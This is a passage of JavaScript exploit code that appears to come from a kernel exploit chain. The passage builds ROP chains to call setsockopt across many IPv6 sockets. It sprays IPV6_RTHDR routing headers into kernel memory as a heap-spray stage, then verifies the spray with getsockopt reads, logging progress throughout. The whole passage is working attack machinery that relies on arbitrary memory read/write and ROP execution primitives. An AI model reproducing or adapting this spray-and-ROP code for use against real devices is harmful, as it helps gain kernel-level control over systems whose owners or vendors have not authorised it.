      mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0)  // buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0)
      mem.write1(rthdr_buf.add(new BigInt(0, 3)), (rthdr_len >> 1))   // buf.putByte(0x03, (byte) (len >> 1))

      // Spray routing headers on all sockets
      var spray_count = 0
      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
        var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
        var setsockopt_store_addr = mem.malloc(0x10)
        var setsockopt_insts = build_rop_chain(
          setsockopt_wrapper,
          new BigInt(0, ipv6_sockets[i]),
          new BigInt(0, IPPROTO_IPV6),
          new BigInt(0, IPV6_RTHDR),
          rthdr_buf,
          new BigInt(0, rthdr_size)
        )
        rop.store(setsockopt_insts, setsockopt_store_addr, 1)

        try {
          rop.execute(setsockopt_insts, setsockopt_store_addr, 0x10)
          var ret = mem.read8(setsockopt_store_addr.add(new BigInt(0, 8)))
          mem.free(setsockopt_store_addr)

          if (ret.hi() === 0xFFFFFFFF && ret.lo() === 0xFFFFFFFF) {
            log('[SPRAY] ERROR: setsockopt failed at socket ' + i)
            break
          }

          spray_count++

          if (i % 20 === 0) {
            log('[SPRAY] Sprayed ' + i + '/' + IPV6_SOCK_NUM)
          }
        } catch (e) {
          log('[SPRAY] ERROR: Exception at socket ' + i + ': ' + e.message)
          mem.free(setsockopt_store_addr)
          break
        }
      }

      if (spray_count === IPV6_SOCK_NUM) {
        log('[SPRAY] SUCCESS - All ' + spray_count + ' routing headers sprayed')
      } else {
        log('[SPRAY] FAILED - Only sprayed ' + spray_count + '/' + IPV6_SOCK_NUM)
      }
    }
  }

  // Read back routing headers with getsockopt to verify
  if (spray_count > 0) {
    log('[VERIFY] Reading back routing headers...')

    var getsockopt_wrapper = new BigInt(kapi.getsockopt_hi, kapi.getsockopt_lo)
    var readback_buf = mem.malloc(UCRED_SIZE)
    var readback_len_buf = mem.malloc(8)
    var verify_count = 0

    for (var i = 0; i < spray_count; i++) {
      // Set optlen to buffer size
      mem.write4(readback_len_buf, new BigInt(0, UCRED_SIZE))

      var getsockopt_store_addr = mem.malloc(0x100)
      var getsockopt_insts = build_rop_chain(
        getsockopt_wrapper,
        new BigInt(0, ipv6_sockets[i]),
        new BigInt(0, IPPROTO_IPV6),
        new BigInt(0, IPV6_RTHDR),
        readback_buf,
        readback_len_buf
      )
      rop.store(getsockopt_insts, getsockopt_store_addr, 1)
      rop.execute(getsockopt_insts, getsockopt_store_addr, 0x10)

      var ret = mem.read8(getsockopt_store_addr.add(new BigInt(0, 8)))
      var actual_len = mem.read4(readback_len_buf)

      mem.free(getsockopt_store_addr)

      if (ret.hi() === 0 && ret.lo() === 0) {
        verify_count++
        if (i % 20 === 0) {
          log('[VERIFY] Socket ' + i + ' getsockopt returned: ' + ret.lo() + ', length: ' + actual_len.lo())
        }
      } else {
        log('[VERIFY] Socket ' + i + ' getsockopt FAILED, returned: ' + ret.toString())
      }
    }

    log('[VERIFY] ' + verify_count + '/' + spray_count + ' routing headers verified')

    mem.free(readback_buf)
    mem.free(readback_len_buf)
  }

  // Cleanup
  mem.free(rthdr_buf)
  mem.free(optlen_buf)
}
